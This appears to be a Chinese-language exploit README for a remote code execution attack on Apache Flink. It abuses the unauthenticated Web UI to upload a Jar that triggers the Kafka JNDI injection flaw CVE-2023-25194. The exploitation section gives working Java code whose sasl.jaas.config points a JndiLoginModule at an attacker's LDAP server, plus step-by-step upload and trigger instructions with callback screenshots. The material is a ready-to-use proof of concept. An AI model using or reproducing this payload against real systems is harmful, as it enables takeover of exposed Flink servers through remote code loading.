# Flink-Kafka-Vul
**Apache Flink远程代码执行漏洞。**

Apache Flink Web UI 默认没有用户权限认证，攻击者可以直接上传恶意Jar包，通过指定Kafka数据源连接属性，利用Apache Kafka JNDI注入(CVE-2023-25194)漏洞[1]攻击Flink，最终实现远程代码执行。

[1] https://kafka.apache.org/cve-list#CVE-2023-25194

# 利用

## 编写不安全的Flink程序

指定Kafka连接参数，其中`sasl.jaas.config`属性设置为`"com.sun.security.auth.module.JndiLoginModule required user.provider.url="ldap://attacker_server" useFirstPass="true" serviceName="x" debug="true" group.provider.url="xxx";`，服务器将连接到攻击者的 LDAP 服务器并反序列化 LDAP 响应。
```
	// 设置执行环境
	final StreamExecutionEnvironment env = StreamExecutionEnvironment.getExecutionEnvironment();
	// 配置 Kafka 连接属性
	Properties properties = new Properties();
	properties.setProperty("bootstrap.servers", "192.168.25.147:9092");
	properties.setProperty("group.id", "flink-kafka-demo");
	properties.setProperty("security.protocol", "SASL_PLAINTEXT");
	properties.setProperty("sasl.mechanism", "PLAIN");
	properties.setProperty("sasl.jaas.config", "com.sun.security.auth.module.JndiLoginModule required user.provider.url=\"ldap://attacker_server\" useFirstPass=\"true\" serviceName=\"x\" debug=\"true\" group.provider.url=\"xxx\";");


	FlinkKafkaConsumer<String> consumer = new FlinkKafkaConsumer("quickstart-events", new SimpleStringSchema(), properties);

	// 从 Kafka 中读取数据
	env.addSource(consumer).print();

	// 执行程序
	env.execute("Flink Kafka Demo");
```

## 触发漏洞

自行将Flink程序打包为Jar：

![1.jpg]

在Apache Flink Dashboard上传恶意Jar，并提交任务：

![2.jpg]

攻击者服务器：

![3.jpg]

DNSlog服务器：

![4.jpg]




